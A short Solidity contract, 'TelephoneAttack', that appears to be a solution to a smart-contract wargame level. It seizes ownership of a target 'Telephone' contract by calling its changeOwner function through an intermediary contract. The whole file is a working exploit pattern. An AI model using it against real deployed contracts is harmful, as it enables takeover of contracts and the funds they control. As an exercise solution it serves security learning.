

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface ITelephone {
    function changeOwner(address _owner) external;

}



contract TelephoneAttack {



    ITelephone telephone;


    constructor(address _telephoneAddress) {

        telephone = ITelephone(_telephoneAddress);

    }

    function attack() public {


        telephone.changeOwner(msg.sender);
       // telephone.changeOwner();
    }



}